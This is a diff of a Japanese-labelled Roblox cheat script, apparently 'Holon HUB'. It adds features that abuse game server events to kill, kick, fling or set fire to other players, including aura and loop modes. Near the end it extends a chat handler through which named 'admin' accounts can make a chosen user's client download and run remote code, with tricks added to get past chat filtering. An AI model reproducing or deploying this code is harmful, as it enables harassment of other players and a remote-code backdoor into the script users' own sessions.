-    local playersInPlots = plotItems and plotItems:FindFirstChild("PlayersInPlots")
-    if playersInPlots and playersInPlots:FindFirstChild(player.Name) then
-        return true
+    if _G.ProtectPlayersInPlots then
+        local plotItems = Workspace:FindFirstChild("PlotItems")
+        local playersInPlots = plotItems and plotItems:FindFirstChild("PlayersInPlots")
+        if (playersInPlots and playersInPlots:FindFirstChild(player.Name)) or (player:FindFirstChild("InPlot") and player.InPlot.Value) then
+            return true
+        end
     end
     return false
+end
+
+-- ===== Blobman Kill Helpers =====
+local cachedCG, cachedCD, cachedCR = nil, nil, nil
+local cachedR_Det, cachedR_Weld    = nil, nil
+local cachedL_Det, cachedL_Weld    = nil, nil
+local cachedBlobman                = nil
+local playerThreads                = {}
+local AURA_RADIUS                  = 35
+local refreshBlobman
+local blobKillActive               = false
+local auraConn                     = nil
+local auraInRange                  = {}
+local selectedBlobTargetName       = ""
+local bmkAuraEnabled               = false
+local bmkLoopKillEnabled           = false
+
+local function HRP()
+    return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+end
+
+local function getOwnedBlobman()
+    local folder = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+    local blobman = folder and folder:FindFirstChild("CreatureBlobman")
+    if blobman and blobman:FindFirstChild("VehicleSeat") then
+        return blobman
+    end
+    return nil
+end
+
+local function tryAutoSitBlobman()
+    local char = LocalPlayer.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not hum or not root then return false end
+
+    refreshBlobman()
+    if cachedBlobman and cachedBlobman:FindFirstChild("VehicleSeat") then
+        local seat = cachedBlobman.VehicleSeat
+        if seat.Occupant == hum then
+            return true
+        end
+    end
+
+    local candidate = getOwnedBlobman()
+    if candidate then
+        local ownedSeat = candidate:FindFirstChild("VehicleSeat")
+        if ownedSeat and ownedSeat.Occupant and ownedSeat.Occupant ~= hum then
+            return false
+        end
+    else
+        for _, v in ipairs(Workspace:GetDescendants()) do
+            if v.Name == "CreatureBlobman" and v:FindFirstChild("VehicleSeat") then
+                local seat = v.VehicleSeat
+                if seat and (not seat.Occupant or seat.Occupant == hum) then
+                    candidate = v
+                    break
+                end
+            end
+        end
+    end
+
+    if not candidate then return false end
+
+    local seat = candidate:FindFirstChild("VehicleSeat")
+    if not seat then return false end
+
+    root.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
+    seat:Sit(hum)
+    task.wait(0.3)
+    refreshBlobman()
+
+    return cachedBlobman == candidate
+end
+
+local function ensureBlobmanReady()
+    if tryAutoSitBlobman() then
+        return true
+    end
+
+    OrionLib:MakeNotification({Name="エラー", Content="乗れるブロブマンが見つかりません", Time=2})
+    return false
+end
+
+refreshBlobman = function()
+    local found = nil
+    local ownedBlobman = getOwnedBlobman()
+    if ownedBlobman then
+        local ownedSeat = ownedBlobman:FindFirstChild("VehicleSeat")
+        local ownedWeld = ownedSeat and ownedSeat:FindFirstChild("SeatWeld")
+        if ownedWeld and ownedWeld.Part1 and LocalPlayer.Character and ownedWeld.Part1:IsDescendantOf(LocalPlayer.Character) then
+            found = ownedBlobman
+        end
+    end
+
+    if not found then
+        for _, v in ipairs(Workspace:GetDescendants()) do
+            if v.Name == "CreatureBlobman" and v:FindFirstChild("VehicleSeat") then
+                local seat = v.VehicleSeat
+                local weld = seat and seat:FindFirstChild("SeatWeld")
+                if weld and weld.Part1 and weld.Part1:IsDescendantOf(LocalPlayer.Character) then
+                    found = v
+                    break
+                end
+            end
+        end
+    end
+    cachedBlobman = found
+    if not found then
+        cachedCG, cachedCD, cachedCR = nil, nil, nil
+        cachedR_Det, cachedR_Weld, cachedL_Det, cachedL_Weld = nil, nil, nil, nil
+        return
+    end
+    local s1 = found:FindFirstChild("BlobmanSeatAndOwnerScript")
+    local s2 = found:FindFirstChild("BlobmanSeatAndOwnerScript[old]")
+    cachedCG     = (s1 and s1:FindFirstChild("CreatureGrab"))    or (s2 and s2:FindFirstChild("CreatureGrab"))    or found:FindFirstChild("CreatureGrab",    true)
+    cachedCD     = (s1 and s1:FindFirstChild("CreatureDrop"))    or (s2 and s2:FindFirstChild("CreatureDrop"))    or found:FindFirstChild("CreatureDrop",    true)
+    cachedCR     = (s1 and s1:FindFirstChild("CreatureRelease")) or (s2 and s2:FindFirstChild("CreatureRelease")) or found:FindFirstChild("CreatureRelease", true)
+    cachedR_Det  = found:FindFirstChild("RightDetector")
+    cachedR_Weld = cachedR_Det and (cachedR_Det:FindFirstChild("RightWeld") or cachedR_Det:FindFirstChildWhichIsA("Weld"))
+    cachedL_Det  = found:FindFirstChild("LeftDetector")
+    cachedL_Weld = cachedL_Det and (cachedL_Det:FindFirstChild("LeftWeld") or cachedL_Det:FindFirstChildWhichIsA("Weld"))
+end
+
+pcall(refreshBlobman)
+Workspace.DescendantAdded:Connect(function(d)
+    if d.Name == "CreatureBlobman" or d.Name == "SeatWeld" then task.defer(refreshBlobman) end
+end)
+Workspace.DescendantRemoving:Connect(function(d)
+    if d == cachedBlobman or d.Name == "SeatWeld" then task.defer(refreshBlobman) end
+end)
+
+local function stopThreads(userId)
+    local st = playerThreads[userId]
+    if st then st.active = false; playerThreads[userId] = nil end
+end
+
+local function startThreads(player, userId)
+    stopThreads(userId)
+    local state = { active = true }
+    playerThreads[userId] = state
+
+    local grabConn
+    grabConn = RunService.Heartbeat:Connect(function()
+        if not state.active then grabConn:Disconnect() return end
+        if not cachedCG then return end
+        local char = player.Character
+        if not char then return end
+        local pHRP = char:FindFirstChild("HumanoidRootPart")
+        if not pHRP then return end
+        pcall(function()
+            if cachedR_Det then
+                cachedCG:FireServer(cachedR_Det, pHRP, cachedR_Weld)
+                cachedR_Weld = cachedR_Det:FindFirstChild("RightWeld")
+                           or cachedR_Det:FindFirstChildWhichIsA("Weld")
+                if cachedCR and cachedR_Weld then cachedCR:FireServer(cachedR_Weld) end
+                if cachedCD and cachedR_Weld then cachedCD:FireServer(cachedR_Weld) end
+            end
+            if cachedL_Det then
+                cachedCG:FireServer(cachedL_Det, pHRP, cachedL_Weld)
+                cachedL_Weld = cachedL_Det:FindFirstChild("LeftWeld")
+                           or cachedL_Det:FindFirstChildWhichIsA("Weld")
+                if cachedCR and cachedL_Weld then cachedCR:FireServer(cachedL_Weld) end
+                if cachedCD and cachedL_Weld then cachedCD:FireServer(cachedL_Weld) end
+            end
+        end)
+    end)
+
+    local killConn
+    killConn = RunService.Heartbeat:Connect(function()
+        if not state.active then killConn:Disconnect() return end
+        local char = player.Character
+        if not char then return end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+        pcall(function()
+            hum.Health = 0
+            hum:ChangeState(Enum.HumanoidStateType.Dead)
+        end)
+    end)
+end
+
+local function stopAura()
+    bmkAuraEnabled = false
+    if auraConn then auraConn:Disconnect() auraConn = nil end
+    for uid in pairs(auraInRange) do stopThreads(uid) end
+    auraInRange = {}
+end
+
+local function startAura()
+    if auraConn then auraConn:Disconnect() auraConn = nil end
+    auraInRange = {}
+
+    auraConn = RunService.Heartbeat:Connect(function()
+        if not bmkAuraEnabled then stopAura() return end
+        local myHRP = HRP()
+        if not myHRP then return end
+        local myPos = myHRP.Position
+        local nowInRange = {}
+
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then
+                local char = p.Character
+                local pHRP = char and char:FindFirstChild("HumanoidRootPart")
+                local shouldProcess = false
+
+                if pHRP then
+                    if (myPos - pHRP.Position).Magnitude <= AURA_RADIUS then
+                        shouldProcess = true
+                    elseif auraInRange[p.UserId] then
+                        stopThreads(p.UserId)
+                    end
+                elseif auraInRange[p.UserId] then
+                    shouldProcess = true
+                end
+
+                if shouldProcess then
+                    nowInRange[p.UserId] = true
+                    if not auraInRange[p.UserId] then
+                        startThreads(p, p.UserId)
+                    end
+                end
+            end
+        end
+
+        for uid in pairs(auraInRange) do
+            if not nowInRange[uid] then stopThreads(uid) end
+        end
+        auraInRange = nowInRange
+    end)
+end
+
+local function blobmanKill(target)
+    if not target then
+        OrionLib:MakeNotification({Name="エラー", Content="ターゲットを選択してください", Time=2})
+        return
+    end
+
+    if target == LocalPlayer then
+        return
+    end
+
+    if blobKillActive then
+        return
+    end
+
+    if not ensureBlobmanReady() then
+        return
+    end
+
+    local char = target.Character
+    if not char then
+        OrionLib:MakeNotification({Name="エラー", Content="ターゲットがスポーンしていません", Time=2})
+        return
+    end
+
+    local tgtHRP = char:FindFirstChild("HumanoidRootPart")
+    if not tgtHRP then
+        return
+    end
+
+    task.spawn(function()
+        local myHRP = HRP()
+        if not myHRP then
+            return
+        end
+
+        blobKillActive = true
+        local originalCF = myHRP.CFrame
+        myHRP.CFrame = tgtHRP.CFrame * CFrame.new(0, 2, -3)
+        startThreads(target, target.UserId)
+
+        OrionLib:MakeNotification({
+            Name = "ブロブマンキル",
+            Content = target.DisplayName .. " にアタック中...",
+            Time = 1
+        })
+
+        task.wait(0.1)
+        task.wait(0.17)
+
+        local myHRP2 = HRP()
+        if myHRP2 then
+            myHRP2.CFrame = originalCF
+        end
+
+        stopThreads(target.UserId)
+        blobKillActive = false
+    end)
+end
+
+local function teleportToBlobKillTarget(target)
+    local myHRP = HRP()
+    local targetChar = target and target.Character
+    local tgtHRP = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    if not myHRP or not tgtHRP then
+        return false
+    end
+
+    myHRP.CFrame = tgtHRP.CFrame * CFrame.new(0, 2, -3)
+    return true
 end
 
 local function setAllKickNetworkOwner(part)
@@ -6104,74 +6932,115 @@ end
 allKickSec:AddButton({
     Name = "キックオール",
     Callback = function()
-        allKickGrabbedPlayers = {}
-        allKickCurrentBlob = nil
-
-        local protectedCount = 0
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and isAllKickProtected(player) then
-                protectedCount = protectedCount + 1
-            end
-        end
-
-        local myRoot = getAllKickRoot()
-        if myRoot then
-            local spawnPos = myRoot.CFrame * CFrame.new(0, 0, -5)
-            pcall(function()
-                ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", spawnPos, Vector3.new(0, 127, 0))
-            end)
-        end
-        task.wait(0.5)
-
-        local folder = getAllKickToyFolder()
-        allKickCurrentBlob = folder and folder:FindFirstChild("CreatureBlobman")
-        if allKickCurrentBlob then
-            local vehicleSeat = allKickCurrentBlob:FindFirstChild("VehicleSeat")
-            local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-            if vehicleSeat and humanoid then vehicleSeat:Sit(humanoid) end
-        end
-        task.wait(0.3)
-
-        myRoot = getAllKickRoot()
-        if myRoot and allKickCurrentBlob then
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= LocalPlayer and not isAllKickProtected(player) and player.Character then
-                    local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
-                    if targetRoot then
-                        myRoot.CFrame = targetRoot.CFrame
-                        task.wait(0.15)
-                        allKickGrab3Times(allKickCurrentBlob, player)
+        task.spawn(function()
+            local allPlayers = {}
+            local protectedCount = 0
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer then
+                    if isAllKickProtected(p) then
+                        protectedCount = protectedCount + 1
+                    else
+                        table.insert(allPlayers, p)
                     end
                 end
             end
-        end
-
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and not isAllKickProtected(player) and player.Character then
-                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
-                if targetRoot then
-                    for _ = 1, 50 do setAllKickNetworkOwner(targetRoot) end
+            if #allPlayers == 0 then return end
+            
+            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if not myRoot then return end
+            
+            -- Blobmanスポーン
+            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", myRoot.CFrame * CFrame.new(0, 0, -5), Vector3.new(0, 127, 0))
+            task.wait(0.5)
+            
+            local folder = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+            local blob = folder and folder:FindFirstChild("CreatureBlobman")
+            if not blob then return end
+            
+            -- 自動着席
+            local seat = blob:FindFirstChild("VehicleSeat")
+            if seat and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                seat:Sit(LocalPlayer.Character.Humanoid)
+            end
+            task.wait(0.3)
+            
+            local grabEv = blob.BlobmanSeatAndOwnerScript.CreatureGrab
+            local relEv = blob.BlobmanSeatAndOwnerScript.CreatureRelease
+            
+            -- フェーズ1: 貫通掴み (3回Grab/Release)
+            for _, target in ipairs(allPlayers) do
+                local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+                if tRoot then
+                    myRoot.CFrame = tRoot.CFrame
+                    task.wait(0.02)
+                    for i = 1, 3 do
+                        pcall(function()
+                            grabEv:FireServer(blob.LeftDetector, tRoot, blob.LeftDetector.LeftWeld)
+                            relEv:FireServer(blob.LeftDetector.LeftWeld)
+                        end)
+                        if i < 3 then task.wait(0.08) end
+                    end
                 end
             end
-        end
+            
+            -- フェーズ2: 上空移動 & 円形配置
+            myRoot.CFrame = CFrame.new(0, 100, 0)
+            task.wait(0.1)
+            for _, part in ipairs(blob:GetDescendants()) do
+                if part:IsA("BasePart") then pcall(function() part.Anchored = true end) end
+            end
+            
+            local radius = 15
+            for i, target in ipairs(allPlayers) do
+                local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+                if tRoot then
+                    local angle = math.rad((i - 1) * (360 / #allPlayers))
+                    local x = radius * math.cos(angle)
+                    local z = radius * math.sin(angle)
+                    tRoot.CFrame = CFrame.new(x, 110, z)
+                end
+            end
+            task.wait(0.1)
+            
+            -- フェーズ3: Aura処理 & 最終キック
+            for _ = 1, 2 do
+                for _, target in ipairs(allPlayers) do
+                    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+                    if tRoot then
+                        pcall(function()
+                            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tRoot, CFrame.new(tRoot.Position))
+                            ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tRoot)
+                        end)
+                    end
+                end
+                task.wait(0.1)
+            end
+            
+            for _, target in ipairs(allPlayers) do
+                local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+                if tRoot then
+                    pcall(function()
+                        grabEv:FireServer(blob.LeftDetector, tRoot, blob.LeftDetector.LeftWeld)
+                        grabEv:FireServer(blob.RightDetector, tRoot, blob.RightDetector.RightWeld)
+                    end)
+                end
+            end
+            
+            task.wait(0.1)
+            for _, part in ipairs(blob:GetDescendants()) do
+                if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
+            end
+            
+            OrionLib:MakeNotification({Name = "キック完了", Content = "対象: " .. #allPlayers .. "人 / 保護: " .. protectedCount .. "人", Time = 4})
+        end)
+    end
+})
 
-        if myRoot then
-            myRoot.CFrame = CFrame.new(0, 70, 0)
-            task.wait(0.2)
-        end
-
-        if allKickCurrentBlob then anchorAllKickBlob(allKickCurrentBlob, true) end
-        local teleportedCount = allKickTeleportCircle(Vector3.new(0, 70, 0), 15)
-        allKickMassGrab(allKickCurrentBlob)
-        task.wait(0.5)
-        if allKickCurrentBlob then anchorAllKickBlob(allKickCurrentBlob, false) end
-
-        OrionLib:MakeNotification({
-            Name = "完了",
-            Content = string.format("対象: %d人\n保護対象: %d人\nKick実行", teleportedCount, protectedCount),
-            Image = "rbxassetid://4483345998",
-            Time = 4
-        })
+allKickSec:AddToggle({
+    Name = "プロット内のプレイヤーを保護",
+    Default = true,
+    Callback = function(v)
+        _G.ProtectPlayersInPlots = v
     end
 })
 
@@ -6208,14 +7077,13 @@ local function flingActionTab(root, hum)
     DebrisService:AddItem(bv, 3)
 end
 
-loopKillTargetDropdown = loopKillSecActionTab:AddDropdown({
+loopKillTargetDropdown = registerPlayerDropdown(loopKillSecActionTab:AddDropdown(withPlayerDropdownStyle({
     Name = "ターゲット選択",
     Default = "選択してください",
-    Options = getPList(),
     Callback = function(v)
         loopKillTargetNameActionTab = parseSelectedPlayerName(v)
     end
-})
+})))
 
 -- ターゲットリストは PlayerAdded / PlayerRemoving で自動更新
 
@@ -6513,7 +7381,154 @@ bringAllSecActionTab:AddToggle({
     end
 })
 
+local fireAllLoopEnabled = false
+local suiseiFireSec = ActionTab:AddSection({ Name = "全員燃やす" })
+suiseiFireSec:AddToggle({
+    Name = "全員を燃やす ループ",
+    Default = false,
+    Callback = function(v)
+        fireAllLoopEnabled = v
+        if v then
+            task.spawn(function()
+                OrionLib:MakeNotification({Name = "Fire All", Content = "ループ実行を開始しました", Time = 2})
+                while fireAllLoopEnabled do
+                    local myChar = LocalPlayer.Character
+                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                    if myRoot then
+                        -- キャンプファイアが存在するか確認、なければスポーン
+                        local folder = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+                        local campfire = folder and folder:FindFirstChild("Campfire")
+                        
+                        if not campfire then
+                            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("Campfire", myRoot.CFrame, Vector3.zero)
+                            task.wait(0.5)
+                            folder = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+                            campfire = folder and folder:FindFirstChild("Campfire")
+                        end
+
+                        if campfire and campfire:FindFirstChild("SoundPart") then
+                            local soundPart = campfire.SoundPart
+                            -- 常に所有権を更新
+                            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(soundPart, myRoot.CFrame)
+
+                            for _, p in ipairs(Players:GetPlayers()) do
+                                if not fireAllLoopEnabled then break end
+                                if p ~= LocalPlayer and not isAllKickProtected(p) and p.Character then
+                                    local tRoot = p.Character:FindFirstChild("HumanoidRootPart")
+                                    if tRoot then
+                                        soundPart.CFrame = tRoot.CFrame
+                                        task.wait(0.1) -- 高速ループによるラグ防止と判定確実化
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    task.wait(0.5) -- 次の巡回までのインターバル
+                end
+                
+                -- オフになった時に後片付け
+                local folder = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+                local campfire = folder and folder:FindFirstChild("Campfire")
+                if campfire then
+                    ReplicatedStorage.MenuToys.DestroyToy:FireServer(campfire)
+                end
+                OrionLib:MakeNotification({Name = "Fire All", Content = "ループを停止しアイテムを削除しました", Time = 2})
+            end)
+        end
+    end
+})
+
+-- Blobman Kill Section
+local blobKillSec = ActionTab:AddSection({ Name = "ブロブマンキル (要Blobman)" })
+
+registerPlayerDropdown(blobKillSec:AddDropdown(withPlayerDropdownStyle({
+    Name = "ターゲット選択",
+    Default = "選択してください",
+    Callback = function(v) selectedBlobTargetName = parseSelectedPlayerName(v) end
+})))
+
+blobKillSec:AddButton({
+    Name = "ブロブキル",
+    Callback = function()
+        local target = Players:FindFirstChild(selectedBlobTargetName)
+        blobmanKill(target)
+    end
+})
+
+blobKillSec:AddToggle({
+    Name = "ブロブループキル",
+    Default = false,
+    Callback = function(v)
+        bmkLoopKillEnabled = v
+        if v then
+            task.spawn(function()
+                while bmkLoopKillEnabled do
+                    local target = Players:FindFirstChild(selectedBlobTargetName)
+                    if target and target ~= LocalPlayer and not isAllKickProtected(target) then
+                        if not blobKillActive then
+                            teleportToBlobKillTarget(target)
+                            blobmanKill(target)
+                        end
+                    end
+                    task.wait(0.1)
+                end
+                for _, p in ipairs(Players:GetPlayers()) do stopThreads(p.UserId) end
+            end)
+        else
+            for _, p in ipairs(Players:GetPlayers()) do stopThreads(p.UserId) end
+        end
+    end
+})
+
+blobKillSec:AddButton({
+    Name = "ブロブオールキル",
+    Callback = function()
+        if not ensureBlobmanReady() then return end
+        local myChar = LocalPlayer.Character
+        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+        local hum = myChar and myChar:FindFirstChildOfClass("Humanoid")
+        if not myRoot or not hum then return end
+        local oldCF = myRoot.CFrame
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer and not isAllKickProtected(p) and p.Character then
+                local tRoot = p.Character:FindFirstChild("HumanoidRootPart")
+                if tRoot then
+                    if not ensureBlobmanReady() then break end
+                    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 2, -3)
+                    startThreads(p, p.UserId)
+                    task.wait(0.27)
+                    stopThreads(p.UserId)
+                end
+            end
+        end
+        if hum.Health > 0 then
+            myRoot.CFrame = oldCF
+        end
+    end
+})
+
+blobKillSec:AddToggle({
+    Name = "ブロブキルオーラ",
+    Default = false,
+    Callback = function(v)
+        if v then
+            if ensureBlobmanReady() then
+                bmkAuraEnabled = true
+                startAura()
+            else
+                bmkAuraEnabled = false
+            end
+        else
+            stopAura()
+        end
+    end
+})
+
+blobKillSec:AddLabel("オーラ半径は固定: 35")
+end
+
 -- --- TAB: KEYBOARD (ported from test.lua) ---
+do
 local keyboardTabSecTeleport = KeyboardTab:AddSection({ Name = "Teleport" })
 local keyboardTabSecAnchor = KeyboardTab:AddSection({ Name = "Anchor Objects" })
 local keyboardTabSecSilentAim = KeyboardTab:AddSection({ Name = "Silent Aim (Solaris)" })
@@ -6907,7 +7922,9 @@ keyboardTabSecAnchor:AddToggle({
         end
     end
 })
+end
 
+do
 local MapBaseSec = KeyboardTab:AddSection({ Name = "マップ基本設定" })
 
 MapBaseSec:AddToggle({
@@ -6935,15 +7952,17 @@ MapBaseSec:AddButton({
 
 local MapTargetSec = KeyboardTab:AddSection({ Name = "マップターゲット・追従設定" })
 
-MapTargetSec:AddDropdown({
+registerPlayerDropdown(MapTargetSec:AddDropdown(withPlayerDropdownStyle({
     Name = "マップ表示/追従対象",
     Default = "なし",
-    Options = getPList(),
+    IncludeNone = true,
     Callback = function(v)
-        local name = v:match("@([^)]+)")
+        local name = parseSelectedPlayerName(v)
         mapTargetPlayer = Players:FindFirstChild(name or "")
     end
-})
+})), function()
+    return getPList(true)
+end)
 
 MapTargetSec:AddToggle({
     Name = "対象のみ表示 (自分は表示)",
@@ -7020,9 +8039,11 @@ UIElements.MapQualityDropdown = MapSizeSec:AddDropdown({
         end
     end
 })
+end
 
 -- ピアノタブは上部で作成済み
 
+do
 local PianoControlSec = PianoTab:AddSection({
 	Name = "ピアノ制御"
 })
@@ -7332,7 +8353,9 @@ PianoManualSec:AddButton({
         end
     end
 })
+end
 
+do
 local SettingsTab = Window:MakeTab({
     Name = "設定",
     Icon = "rbxassetid://7072721682"
@@ -7480,11 +8503,12 @@ UIElements.UIBackgroundImage = UISec:AddTextbox({
 
 local DetailTab = Window:MakeTab({Name = "詳細", Icon = DetailIcon})
 AddDetailContent(DetailTab)
+end
 
 -- 通知（起動時）
 OrionLib:MakeNotification({
 	Name = "Holon HUB",
-	Content = "v1.5.2 が読み込まれました！",
+	Content = "v1.5.5 が読み込まれました！",
 	Time = 5
 })
     -- 起動時にUIスタイルを適用
@@ -7510,7 +8534,11 @@ OrionLib:MakeNotification({
         ["ぱ"]="P1", ["ぴ"]="P2", ["ぷ"]="P3", ["ぺ"]="P4", ["ぽ"]="P5"
     }
 
-    TextChatService.MessageReceived:Connect(function(message)
+    -- 既存のチャット接続があれば切断して重複を防ぐ
+    if _G.HolonChatConnection then _G.HolonChatConnection:Disconnect() end
+    local isCommandRunning = false -- コマンド実行中のフラグ
+
+    _G.HolonChatConnection = TextChatService.MessageReceived:Connect(function(message)
         local source = message.TextSource
         if not source then return end
         
@@ -7523,25 +8551,36 @@ OrionLib:MakeNotification({
 
         -- 管理者権限チェック (najayou777, najryou777 のみ許可)
         if admins[sender.Name] then
-            if text == "/k" then
+            if text == "/k" or text:sub(1, 3) == "/k " then
                 -- /k コマンドへの反応
                 task.wait(0.5)
                 channel:SendAsync("開発者だよ。")
-            elseif text == "/h" then
+            elseif text == "/h" or text:sub(1, 3) == "/h " then
                 -- /h コマンド
                 task.wait(0.1)
                 channel:SendAsync("ほろん")
             elseif text:sub(1,3) == "/s " then
                 -- /s <user> コマンド
-                local targetUser = text:sub(4)
-                if targetUser == LocalPlayer.Name or targetUser == tostring(LocalPlayer.UserId) then
+                if isCommandRunning then return end -- 実行中なら無視
+                isCommandRunning = true
+
+                -- 規制(####)対策: 入力された文字列からスペース、ドット、カンマ、ハイフンを無視して判定
+                local targetUser = text:sub(4):gsub("[%s%.%,%-]", "")
+                local myName = LocalPlayer.Name:gsub("[%s%.%,%-]", "")
+                local myDisplayName = LocalPlayer.DisplayName:gsub("[%s%.%,%-]", "")
+                local myId = tostring(LocalPlayer.UserId)
+
+                if targetUser == myName or targetUser == myId or targetUser == myDisplayName then
                     OrionLib:MakeNotification({Name = "コマンド実行", Content = "外部スクリプトを読み込み中...", Time = 2})
                     task.spawn(function()
                         local success, err = pcall(function()
                             loadstring(game:HttpGet("https://raw.githubusercontent.com/hololove1021/HolonHUB/refs/heads/main/important/tmg/test.lua"))()
                         end)
+                        isCommandRunning = false
                         if not success then warn("Script load error: " .. err) end
                     end)
+                else
+                    isCommandRunning = false
                 end
             elseif text:sub(1,3) == "/c " then
                 -- /c <text> 暗号化コマンド
